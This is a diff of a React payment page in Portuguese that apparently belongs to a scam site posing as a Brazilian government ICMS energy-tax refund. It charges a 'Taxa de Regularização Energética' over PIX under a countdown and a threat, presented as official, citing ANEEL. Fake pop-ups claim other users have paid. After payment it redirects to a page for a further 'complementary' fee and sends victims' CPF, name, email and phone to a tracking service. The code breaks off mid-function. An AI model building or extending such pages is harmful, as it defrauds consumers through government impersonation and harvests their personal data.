@@ -3,7 +3,7 @@ import { useLocation } from "wouter";
 import { Card, CardContent } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
-import { Copy, CheckCircle, Info, AlertCircle, AlertTriangle, Bell, Loader, Landmark } from "lucide-react";
+import { Copy, CheckCircle, Info, AlertCircle, AlertTriangle, Bell, Loader, Landmark, ArrowRight } from "lucide-react";
 import { Separator } from "@/components/ui/separator";
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
 import { useToast } from "@/hooks/use-toast";
@@ -11,7 +11,7 @@ import { Toaster } from "@/components/ui/toaster";
 import { playNotificationSound } from "@/components/NotificationSound";
 import Header from "@/components/Header";
 import Footer from "@/components/Footer";
-import { paymentApi } from "@/lib/for4payments";
+import { notifyPixGenerated, notifyPaymentConfirmed } from "@/lib/utmify";
 
 // Gerar um código PIX aleatório
 const gerarCodigoPix = () => {
@@ -39,36 +39,32 @@ interface NotificacaoProps {
 }
 
 const Notificacao = ({ nome, valor, onClose }: NotificacaoProps) => {
-  // Não precisamos mais tocar o som aqui, pois já estamos tocando no nível superior
-  // Este componente agora é apenas visual
-  
   return (
-    <div className="max-w-sm w-full bg-white shadow-lg rounded-lg border border-gray-200 overflow-hidden">
+    <div className="w-full bg-white shadow-sm rounded-md border border-gray-100 overflow-hidden animate-fade-in">
       <div className="flex items-start p-3">
-        <div className="flex-shrink-0 pt-0.5">
-          <div className="h-8 w-8 rounded-full bg-green-100 flex items-center justify-center">
-            <Bell className="h-4 w-4 text-green-600" />
+        <div className="flex-shrink-0">
+          <div className="h-8 w-8 rounded-full bg-green-50 flex items-center justify-center">
+            <CheckCircle className="h-4 w-4 text-green-600" />
           </div>
         </div>
-        <div className="ml-3 w-0 flex-1">
-          <p className="text-sm font-medium text-gray-900">
-            Nova transação
+        <div className="ml-3 flex-1">
+          <p className="text-sm font-medium text-gray-700 flex items-center">
+            <span className="w-2 h-2 bg-green-500 rounded-full mr-1.5 animate-pulse"></span>
+            Pagamento confirmado
           </p>
-          <p className="mt-1 text-sm text-gray-500">
-            <strong>{nome}</strong> acabou de pagar a TRE para uma restituição de <strong className="text-green-600">{valor}</strong>
+          <p className="mt-1 text-sm text-gray-600 leading-tight">
+            <span className="font-medium">{nome}</span> acabou de pagar a Taxa de Regularização Energética e irá receber <span className="font-medium text-green-600">{valor}</span>
           </p>
         </div>
-        <div className="ml-4 flex-shrink-0 flex">
-          <button
-            className="bg-white rounded-md inline-flex text-gray-400 hover:text-gray-500 focus:outline-none"
-            onClick={onClose}
-          >
-            <span className="sr-only">Fechar</span>
-            <svg className="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
-              <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd" />
-            </svg>
-          </button>
-        </div>
+        <button
+          className="ml-3 flex-shrink-0 text-gray-400 hover:text-gray-500 focus:outline-none"
+          onClick={onClose}
+        >
+          <span className="sr-only">Fechar</span>
+          <svg className="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
+            <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd" />
+          </svg>
+        </button>
       </div>
     </div>
   );
@@ -171,11 +167,6 @@ export default function PagamentoPix() {
     setTimeout(() => setCopied(false), 3000);
   };
   
-  // Simular o pagamento (para fins de demonstração)
-  const simularPagamento = () => {
-    navigate("/sucesso");
-  };
-  
   // Formatar o tempo do contador (mm:ss)
   const formatarTempo = (segundos: number) => {
     const minutos = Math.floor(segundos / 60);
@@ -188,7 +179,7 @@ export default function PagamentoPix() {
     try {
       setIsLoading(true);
       
-      // Chamar a API para criar um pagamento
+      // Chamar a API para criar um pagamento com todos os parâmetros necessários
       const response = await fetch('/api/pagamentos', {
         method: 'POST',
         headers: {
@@ -199,7 +190,7 @@ export default function PagamentoPix() {
           cpf: cpf,
           email: email,
           telefone: telefone,
-          valor: 74.90
+          valor: 74.90 // Valor fixo da Taxa TRE
         })
       });
 
@@ -211,17 +202,23 @@ export default function PagamentoPix() {
       setPaymentInfo(payment);
       setCodigoPix(payment.pixCode);
       
-      toast({
-        title: "Pagamento gerado com sucesso!",
-        description: "Use o QR code ou código PIX para efetuar o pagamento."
-      });
+      // Enviar informação para UTMify sobre o PIX gerado
+      try {
+        await notifyPixGenerated(
+          payment.id,
+          cpf,
+          nome,
+          email,
+          telefone,
+          7490 // valor em centavos (R$ 74,90)
+        );
+        console.log("Notificação UTMify enviada com sucesso - PIX gerado");
+      } catch (utmifyError) {
+        console.error("Erro ao enviar notificação para UTMify:", utmifyError);
+        // Não interrompe o fluxo principal se houver erro na integração com UTMify
+      }
     } catch (error) {
       console.error('Erro ao criar pagamento:', error);
-      toast({
-        title: "Erro ao gerar pagamento",
-        description: "Não foi possível gerar o código PIX. Tente novamente.",
-        variant: "destructive"
-      });
     } finally {
       setIsLoading(false);
     }
@@ -232,22 +229,45 @@ export default function PagamentoPix() {
     if (!paymentInfo?.id) return;
     
     setIsLoading(true);
+    console.log("[VerificaçãoPIX] Verificando status do pagamento:", paymentInfo.id);
     
     try {
       const response = await fetch(`/api/pagamentos/${paymentInfo.id}/status`);
       
       if (response.ok) {
         const data = await response.json();
+        console.log("[VerificaçãoPIX] Status recebido da API:", data.status);
+        
+        // Atualizar o estado com o status atual
         setPaymentStatus(data.status);
         
-        if (data.status === 'completed') {
+        // Somente redirecionar se o status for realmente 'completed'
+        if (data.status === 'completed' || data.status === 'COMPLETED' || data.status === 'PAID' || data.status === 'paid') {
+          console.log("[VerificaçãoPIX] Pagamento CONFIRMADO. Preparando redirecionamento...");
+          
           toast({
             title: "Pagamento confirmado!",
             description: "Seu pagamento foi processado com sucesso. Redirecionando...",
             variant: "default"
           });
           
-          // Redirecionar para a página de sucesso com todos os parâmetros necessários
+          // Enviar informação para UTMify sobre o pagamento confirmado
+          try {
+            await notifyPaymentConfirmed(
+              paymentInfo.id,
+              cpf,
+              nome,
+              email,
+              telefone,
+              7490 // valor em centavos (R$ 74,90)
+            );
+            console.log("[VerificaçãoPIX] Notificação UTMify enviada com sucesso - Pagamento confirmado");
+          } catch (utmifyError) {
+            console.error("[VerificaçãoPIX] Erro ao enviar notificação para UTMify:", utmifyError);
+            // Não interrompe o fluxo principal se houver erro na integração com UTMify
+          }
+          
+          // Preparar parâmetros para o redirecionamento
           const params = new URLSearchParams({
             cpf: cpf,
             nome: nome,
@@ -263,19 +283,19 @@ export default function PagamentoPix() {
             telefone: telefone
           });
           
-          // Redirecionar para a página de sucesso
+          // Redirecionar para a página de taxa complementar após confirmação real
+          console.log("[VerificaçãoPIX] Redirecionando para a página de taxa complementar");
           setTimeout(() => {
-            navigate(`/sucesso?${params.toString()}`);
+            navigate(`/taxa-complementar?${params.toString()}`);
           }, 1500);
+        } else {
+          console.log("[VerificaçãoPIX] Pagamento ainda pendente:", data.status);
         }
+      } else {
+        console.error("[VerificaçãoPIX] Resposta da API não foi OK:", response.status);
       }
     } catch (error) {
-      console.error('Erro ao verificar status do pagamento:', error);
-      toast({
-        title: "Erro na verificação",
-        description: "Não foi possível verificar o status do pagamento. Tente novamente.",
-        variant: "destructive"
-      });
+      console.error('[VerificaçãoPIX] Erro ao verificar status do pagamento:', error);
     } finally {
       setIsLoading(false);
     }
@@ -380,12 +400,12 @@ export default function PagamentoPix() {
   return (
     <>
       <Header />
-      <main className="container mx-auto px-4 py-8 min-h-screen">
+      <main className="container mx-auto px-2 py-4 min-h-screen">
         {/* Este componente é necessário para o toast */}
         <Toaster />
         
-        {/* Notificações flutuantes - Aparecem no canto superior direito */}
-        <div className="fixed top-4 right-4 z-50 w-full max-w-sm space-y-2">
+        {/* Notificações flutuantes - Aparecem centralizadas no topo */}
+        <div className="fixed top-4 left-1/2 transform -translate-x-1/2 z-50 w-full max-w-md space-y-2 flex flex-col items-center">
           {notificacoes.map((notif) => (
             <Notificacao
               key={notif.id}
@@ -396,286 +416,292 @@ export default function PagamentoPix() {
           ))}
         </div>
         
-        <div className="p-6 relative bg-gray-50 rounded-lg shadow-md max-w-6xl mx-auto">
-          <div className="flex justify-between items-center mb-4 border-b pb-3 border-gray-300">
-            <div className="text-left">
-              <h3 className="text-[var(--gov-blue-dark)] font-bold text-lg">Restituição de ICMS</h3>
-              <p className="text-xs text-gray-600">Protocolo nº {cpf.substring(0,4)}4714{cpf.substring(6,9)}</p>
-            </div>
-            <div className="text-right">
-              <p className="font-semibold text-red-600">Taxa de Regularização: {valorTaxaFormatado}</p>
-              <p className="text-xs text-gray-600">Vencimento: <span className="countdown font-medium">{formatarTempo(tempoRestante)}</span></p>
+        <div className="p-3 sm:p-4 relative bg-gray-50 rounded-lg shadow-md w-full mx-auto">
+          <div className="bg-[#1351B4] text-white p-4 rounded-md mb-5 shadow-sm">
+            <div className="flex flex-col md:flex-row md:justify-between md:items-center gap-3">
+              <div className="text-left">
+                <div className="flex items-center mb-1">
+                  <Landmark className="mr-2 h-5 w-5 text-white" />
+                  <h3 className="font-bold text-lg">Restituição de ICMS</h3>
+                </div>
+                <div className="bg-[#0C4DA2] text-white text-xs px-2 py-1 rounded inline-flex items-center">
+                  <Info size={12} className="mr-1" />
+                  Protocolo nº {cpf.substring(0,4)}4714{cpf.substring(6,9)}
+                </div>
+              </div>
+              <div className="text-right bg-[#0C4DA2] rounded-md p-3">
+                <p className="font-medium text-white text-sm mb-1">Taxa de Regularização:</p>
+                <p className="font-bold text-lg text-white">{valorTaxaFormatado}</p>
+                <div className="flex items-center justify-end mt-1 text-xs text-white">
+                  <AlertCircle size={12} className="mr-1" />
+                  <span>Vencimento: <span className="font-medium">{formatarTempo(tempoRestante)}</span></span>
+                </div>
+              </div>
             </div>
           </div>
           
-          <div className="mb-5">
-            <div className="bg-[var(--gov-blue-dark)] text-white py-2 px-3 rounded-t-md font-semibold text-sm">DADOS DO SOLICITANTE</div>
-            <div className="border border-t-0 border-gray-300 rounded-b-md p-4 bg-white mb-4">
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+          <div className="mb-6">
+            <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center">
+              <div className="bg-white/20 p-1.5 rounded-md mr-2">
+                <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
+                </svg>
+              </div>
+              DADOS DO SOLICITANTE
+            </div>
+            <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm mb-4">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                 <div>
-                  <p className="mb-1 text-xs text-gray-500">Nome completo</p>
-                  <p className="font-medium text-gray-800 mb-3">{nome}</p>
-                  <p className="mb-1 text-xs text-gray-500">CPF</p>
-                  <p className="font-medium text-gray-800 mb-3">{cpfFormatado}</p>
-                  <p className="mb-1 text-xs text-gray-500">Companhia Elétrica</p>
-                  <p className="font-medium text-gray-800">{companhia}</p>
+                  <div className="mb-4">
+                    <p className="mb-1 text-xs font-medium text-gray-500 uppercase tracking-wide">Nome completo</p>
+                    <p className="font-semibold text-gray-800 bg-gray-50 p-2 rounded-md border border-gray-100">{nome}</p>
+                  </div>
+                  <div className="mb-4">
+                    <p className="mb-1 text-xs font-medium text-gray-500 uppercase tracking-wide">CPF</p>
+                    <p className="font-semibold text-gray-800 bg-gray-50 p-2 rounded-md border border-gray-100">{cpfFormatado}</p>
+                  </div>
+                  <div>
+                    <p className="mb-1 text-xs font-medium text-gray-500 uppercase tracking-wide">Companhia Elétrica</p>
+                    <p className="font-semibold text-gray-800 bg-gray-50 p-2 rounded-md border border-gray-100">{companhia}</p>
+                  </div>
                 </div>
                 <div>
-                  <div className="p-3 bg-amber-50 border-l-4 border-amber-400 mb-3">
-                    <p className="text-amber-800 font-medium text-sm">Situação da solicitação:</p>
-                    <p className="text-red-600 font-bold">PENDENTE - AGUARDANDO PAGAMENTO</p>
+                  <div className="p-4 bg-amber-50 border-l-4 border-amber-400 rounded-r-md mb-4 shadow-sm">
+                    <p className="text-amber-800 font-medium text-sm mb-1 flex items-center">
+                      <AlertTriangle size={16} className="mr-1.5" />
+                      Situação da solicitação:
+                    </p>
+                    <p className="text-red-600 font-bold flex items-center">
+                      <span className="inline-block w-2 h-2 bg-red-600 rounded-full mr-2 animate-pulse"></span>
+                      PENDENTE - AGUARDANDO PAGAMENTO
+                    </p>
                   </div>
-                  <div className="flex items-center mb-3">
-                    <div className="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mr-3">
-                      <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                </div>
+              </div>
+            </div>
+            
+            <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center">
+              <div className="bg-white/20 p-1.5 rounded-md mr-2">
+                <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" />
+                </svg>
+              </div>
+              DETALHES DA RESTITUIÇÃO
+            </div>
+            <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm mb-6">
+              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+                <div className="bg-gradient-to-br from-red-50 to-red-100 rounded-lg shadow-sm p-4 border border-red-200">
+                  <div className="flex items-center mb-2">
+                    <div className="w-8 h-8 bg-red-500 rounded-full flex items-center justify-center mr-3">
+                      <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                         <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                       </svg>
                     </div>
                     <div>
-                      <p className="text-xs text-gray-500 mb-0">Valor aprovado</p>
-                      <p className="font-semibold text-gray-800">{valorFormatado}</p>
+                      <p className="text-xs font-medium text-red-800 uppercase tracking-wide">Taxa de Regularização</p>
+                      <p className="font-bold text-red-600 text-lg">{valorTaxaFormatado}</p>
                     </div>
                   </div>
-                  <div className="flex items-center">
-                    <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mr-3">
-                      <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 14v3m4-3v3m4-3v3M3 21h18M3 10h18M3 7l9-4 9 4M4 10h16v11H4V10z" />
+                  <p className="text-xs text-red-800 mt-2 pl-11">Pagamento único para liberação da restituição</p>
+                </div>
+                
+                <div className="bg-gradient-to-br from-green-50 to-green-100 rounded-lg shadow-sm p-4 border border-green-200">
+                  <div className="flex items-center mb-2">
+                    <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center mr-3">
+                      <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2z" />
                       </svg>
                     </div>
                     <div>
-                      <p className="text-xs text-gray-500 mb-0">Banco para depósito</p>
-                      <p className="font-semibold text-gray-800">{bancoNome || "Banco informado"}</p>
+                      <p className="text-xs font-medium text-green-800 uppercase tracking-wide">Valor aprovado</p>
+                      <p className="font-bold text-green-600 text-lg">{valorFormatado}</p>
                     </div>
                   </div>
+                  <p className="text-xs text-green-800 mt-2 pl-11">Valor total a ser depositado</p>
                 </div>
-              </div>
-            </div>
-            
-            <div className="bg-[var(--gov-blue-dark)] text-white py-2 px-3 rounded-t-md font-semibold text-sm">DETALHES DA RESTITUIÇÃO</div>
-            <div className="border border-t-0 border-gray-300 rounded-b-md p-4 bg-white mb-4">
-              <div className="flex flex-wrap -mx-2">
-                <div className="w-full md:w-1/3 px-2 mb-3 md:mb-0">
-                  <div className="p-3 bg-gray-100 rounded-md h-full">
-                    <p className="text-xs text-gray-500 mb-1">Taxa de Regularização</p>
-                    <p className="font-medium text-red-600">{valorTaxaFormatado}</p>
-                  </div>
-                </div>
-                <div className="w-full md:w-1/3 px-2 mb-3 md:mb-0">
-                  <div className="p-3 bg-gray-100 rounded-md h-full">
-                    <p className="text-xs text-gray-500 mb-1">Valor aprovado</p>
-                    <p className="font-medium text-green-600">{valorFormatado}</p>
-                  </div>
-                </div>
-                <div className="w-full md:w-1/3 px-2">
-                  <div className="p-3 bg-gray-100 rounded-md h-full">
-                    <p className="text-xs text-gray-500 mb-1">Prazo de pagamento</p>
-                    <p className="font-medium text-amber-600">{formatarTempo(tempoRestante)}</p>
-                  </div>
-                </div>
-              </div>
-              
-              <div className="mt-4 bg-blue-50 p-3 border-l-4 border-blue-400 rounded-r-md">
-                <div className="flex items-start">
-                  <div className="text-blue-500 mt-1 mr-2">
-                    <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
-                    </svg>
-                  </div>
-                  <div>
-                    <p className="text-sm text-blue-800 font-medium">Importante: <span className="font-normal">Prazo de depósito</span></p>
-                    <p className="text-xs text-gray-600 mt-1">Após a confirmação do pagamento da Taxa de Regularização, o valor de {valorFormatado} será depositado em sua conta bancária em até 72 horas úteis.</p>
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-            <div className="bg-[var(--gov-blue-dark)] text-white py-2 px-3 rounded-t-md font-semibold text-sm">PAGAMENTO VIA PIX</div>
-            <div className="border border-t-0 border-gray-300 rounded-b-md p-4 bg-white mb-4">
-              <div className="mb-4">
-                <div className="flex justify-center">
-                  <Tabs defaultValue="qrcode" className="w-full">
-                    <TabsList className="w-full mb-4">
-                      <TabsTrigger value="qrcode" className="flex-1">QR Code PIX</TabsTrigger>
-                      <TabsTrigger value="copiacola" className="flex-1">Copia e Cola</TabsTrigger>
-                    </TabsList>
-                    
-                    <TabsContent value="qrcode" className="mt-2">
-                      <div className="flex flex-col items-center justify-center">
-                        {isLoading ? (
-                          <div className="py-8 flex flex-col items-center justify-center space-y-3">
-                            <Loader className="h-10 w-10 text-[var(--gov-blue)] animate-spin" />
-                            <p className="text-[var(--gov-blue-dark)]">Gerando código de pagamento...</p>
-                          </div>
-                        ) : !paymentInfo ? (
-                          <div className="py-8 text-center space-y-4">
-                            <AlertCircle className="h-10 w-10 text-red-500 mx-auto" />
-                            <p className="text-red-600">Não foi possível gerar o código PIX</p>
-                            <Button 
-                              onClick={criarPagamento} 
-                              className="bg-[var(--gov-blue)] hover:bg-[var(--gov-blue-dark)]"
-                            >
-                              Tentar Novamente
-                            </Button>
-                          </div>
-                        ) : (
-                          <>
-                            <div className="border-4 border-[var(--gov-blue)] rounded-lg p-3 mb-4 bg-white max-w-xs">
-                              <img 
-                                src={paymentInfo.pixQrCode}
-                                alt="QR Code do PIX" 
-                                className="w-full h-auto" 
-                              />
-                            </div>
-                            <div className="bg-gray-50 w-full max-w-sm p-4 rounded-lg text-center border border-gray-200">
-                              <p className="text-sm text-gray-600 mb-1">Valor a ser pago:</p>
-                              <p className="text-2xl font-bold text-[var(--gov-blue-dark)]">{valorTaxaFormatado}</p>
-                              <p className="text-xs text-gray-500 mt-1">TRE - Taxa de Regularização Energética</p>
-                            </div>
-                          </>
-                        )}
-                      </div>
-                    </TabsContent>
-                    
-                    <TabsContent value="copiacola" className="mt-2">
-                      <div>
-                        {isLoading ? (
-                          <div className="py-8 flex flex-col items-center justify-center space-y-3">
-                            <Loader className="h-10 w-10 text-[var(--gov-blue)] animate-spin" />
-                            <p className="text-[var(--gov-blue-dark)]">Gerando código de pagamento...</p>
-                          </div>
-                        ) : !paymentInfo ? (
-                          <div className="py-8 text-center space-y-4">
-                            <AlertCircle className="h-10 w-10 text-red-500 mx-auto" />
-                            <p className="text-red-600">Não foi possível gerar o código PIX</p>
-                            <Button 
-                              onClick={criarPagamento} 
-                              className="bg-[var(--gov-blue)] hover:bg-[var(--gov-blue-dark)]"
-                            >
-                              Tentar Novamente
-                            </Button>
-                          </div>
-                        ) : (
-                          <>
-                            <p className="text-sm text-gray-600 mb-2 text-center">Copie o código abaixo:</p>
-                            <div className="flex items-center max-w-xl mx-auto">
-                              <div className="flex-1 bg-white border border-gray-300 p-3 rounded-l-md font-mono text-xs break-all">
-                                {codigoPix}
-                              </div>
-                              <button 
-                                onClick={copiarCodigoPix}
-                                className="bg-[var(--gov-blue)] text-white p-3 rounded-r-md hover:bg-[var(--gov-blue-dark)]"
-                              >
-                                {copied ? <CheckCircle className="h-5 w-5" /> : <Copy className="h-5 w-5" />}
-                              </button>
-                            </div>
-                            <div className="bg-gray-100 p-4 rounded-md text-gray-700 text-sm mt-4 max-w-xl mx-auto">
-                              <h4 className="font-semibold mb-2">Como pagar com o PIX Copia e Cola:</h4>
-                              <ol className="list-decimal pl-5 space-y-1">
-                                <li>Clique no botão azul acima para copiar o código</li>
-                                <li>Abra o aplicativo do seu banco</li>
-                                <li>Vá para a área de PIX ou pagamentos</li>
-                                <li>Selecione a opção "Pix Copia e Cola"</li>
-                                <li>Cole o código e confirme o pagamento</li>
-                              </ol>
-                            </div>
-                          </>
-                        )}
-                      </div>
-                    </TabsContent>
-                  </Tabs>
-                </div>
-              </div>
-              
-              <div className="mt-6">
-                <Button 
-                  onClick={verificarStatusPagamento}
-                  disabled={!paymentInfo || isLoading || paymentStatus === 'completed'}
-                  className={`w-full font-bold py-6 text-lg mb-3 transition-all duration-300 transform hover:scale-105 ${
-                    paymentStatus === 'completed' 
-                      ? 'bg-green-500 hover:bg-green-600 text-white' 
-                      : 'bg-[var(--gov-green)] hover:bg-[var(--gov-green)]/90 text-white'
-                  }`}
-                >
-                  {paymentStatus === 'completed' ? (
-                    <div className="flex items-center justify-center">
-                      <CheckCircle className="mr-2 h-5 w-5" />
-                      Pagamento Confirmado
-                    </div>
-                  ) : isLoading ? (
-                    <div className="flex items-center justify-center">
-                      <Loader className="mr-2 h-5 w-5 animate-spin" />
-                      Verificando...
-                    </div>
-                  ) : (
-                    "Já fiz o pagamento"
-                  )}
-                </Button>
                 
-                <div className="bg-red-600 p-4 rounded-md mb-4 text-white shadow-md">
+                <div className="bg-gradient-to-br from-amber-50 to-amber-100 rounded-lg shadow-sm p-4 border border-amber-200">
                   <div className="flex items-center mb-2">
-                    <AlertTriangle className="h-5 w-5 text-yellow-300 mr-2" />
-                    <h3 className="font-bold text-base">NOTIFICAÇÃO OFICIAL</h3>
+                    <div className="w-8 h-8 bg-amber-500 rounded-full flex items-center justify-center mr-3">
+                      <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
+                      </svg>
+                    </div>
+                    <div>
+                      <p className="text-xs font-medium text-amber-800 uppercase tracking-wide">Prazo de pagamento</p>
+                      <p className="font-bold text-amber-600 text-lg">{formatarTempo(tempoRestante)}</p>
+                    </div>
                   </div>
-                  <p className="mb-3 text-sm">
-                    Ao prosseguir, você concordou com o pagamento da Taxa de Regularização no valor de <strong>{valorTaxaFormatado}</strong>. 
-                    Conforme a resolução ANEEL nº 1.000/2021, o não pagamento resultará em <strong>cancelamento automático</strong> da sua solicitação de restituição.
-                  </p>
-                  <p className="font-semibold text-sm">
-                    Efetue o pagamento em até <span className="font-bold">{formatarTempo(tempoRestante)}</span> para garantir sua restituição de <strong>{valorFormatado}</strong>.
-                  </p>
+                  <p className="text-xs text-amber-800 mt-2 pl-11">Tempo restante para realizar o pagamento</p>
                 </div>
               </div>
             </div>
           </div>
           
-          {/* Seção de Garantia de Segurança - Movida conforme solicitado */}
-          <div className="mb-5">
-            <div className="border border-green-200 bg-green-50 rounded-lg p-5 shadow-sm">
-              <div className="flex items-center mb-3">
-                <div className="w-10 h-10 rounded-full bg-green-100 flex items-center justify-center mr-3">
-                  <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 text-green-700" viewBox="0 0 20 20" fill="currentColor">
-                    <path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
-                  </svg>
+          <div className="flex flex-col md:flex-row gap-4 mb-6">
+            <div className="flex-1 bg-white border border-gray-200 rounded-lg shadow-sm p-5">
+              <h3 className="font-semibold text-lg mb-3">Escaneie o código PIX abaixo:</h3>
+              
+              <div className="flex flex-col items-center mb-4">
+                <div className="bg-white p-4 border border-gray-200 rounded-md shadow-sm mb-4 w-56 h-56 flex items-center justify-center">
+                  {isLoading ? (
+                    <div className="flex flex-col items-center space-y-2">
+                      <Loader className="animate-spin h-8 w-8 text-gray-400" />
+                      <span className="text-sm text-gray-500">Gerando código PIX...</span>
+                    </div>
+                  ) : paymentInfo?.pixQrCode ? (
+                    <img 
+                      src={paymentInfo.pixQrCode} 
+                      alt="QR Code PIX" 
+                      className="max-w-full max-h-full object-contain" 
+                    />
+                  ) : (
+                    <div className="text-center text-gray-500">
+                      <AlertTriangle className="h-10 w-10 mx-auto mb-2" />
+                      <p>Não foi possível gerar o QR Code PIX</p>
+                    </div>
+                  )}
                 </div>
-                <h3 className="font-bold text-green-800 text-xl">GARANTIA DE SEGURANÇA</h3>
               </div>
               
-              <p className="text-green-700 ml-2 text-lg mb-4">
-                Este procedimento é fiscalizado e regulamentado por órgãos oficiais, com garantia de:
-              </p>
+              <div>
+                <div className="rounded-md bg-gray-50 border border-gray-200 p-3 mb-4">
+                  <div className="flex justify-between items-center mb-2">
+                    <p className="text-sm font-medium text-gray-700">Código PIX (Copiar e colar)</p>
+                    <Button 
+                      variant="outline" 
+                      size="sm" 
+                      className="h-8 text-xs"
+                      onClick={copiarCodigoPix}
+                      disabled={isLoading || !codigoPix}
+                    >
+                      {copied ? (
+                        <div className="flex items-center">
+                          <CheckCircle className="h-4 w-4 mr-1 text-green-600" />
+                          Copiado
+                        </div>
+                      ) : (
+                        <div className="flex items-center">
+                          <Copy className="h-4 w-4 mr-1" />
+                          Copia e Cola
+                        </div>
+                      )}
+                    </Button>
+                  </div>
+                  <div className="rounded-md bg-white border border-gray-200 p-2 overflow-x-auto">
+                    <p className="text-xs font-mono text-gray-600 whitespace-nowrap">
+                      {isLoading ? (
+                        <span className="text-gray-400">Gerando código PIX...</span>
+                      ) : codigoPix ? (
+                        codigoPix
+                      ) : (
+                        <span className="text-red-400">Erro ao gerar código PIX. Tente novamente.</span>
+                      )}
+                    </p>
+                  </div>
+                </div>
+                
+                <Button 
+                  className="w-full bg-[#1351B4] font-medium hover:bg-[#0C4DA2] transition mb-4" 
+                  onClick={verificarStatusPagamento}
+                  disabled={isLoading || !paymentInfo?.id}
+                >
+                  {isLoading ? (
+                    <div className="flex items-center justify-center">
+                      <Loader className="mr-2 h-5 w-5 animate-spin" />
+                      Verificando Pagamento...
+                    </div>
+                  ) : (
+                    <div className="flex items-center justify-center">
+                      <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+                      </svg>
+                      Já fiz o pagamento
+                    </div>
+                  )}
+                </Button>
+
+                {/* Botão para avançar manualmente para a próxima página */}
+                <Button 
+                  variant="outline"
+                  className="w-full bg-amber-50 border-amber-300 text-amber-800 hover:bg-amber-100 hover:text-amber-900 mb-4"
+                  onClick={() => {
+                    // Preparar parâmetros para o redirecionamento
+                    const params = new URLSearchParams({
+                      cpf: cpf,
+                      nome: nome,
+                      valor: valor.toString(),
+                      pagamentoId: paymentInfo?.id || "manual",
+                      dataPagamento: new Date().toISOString(),
+                      companhia: companhia,
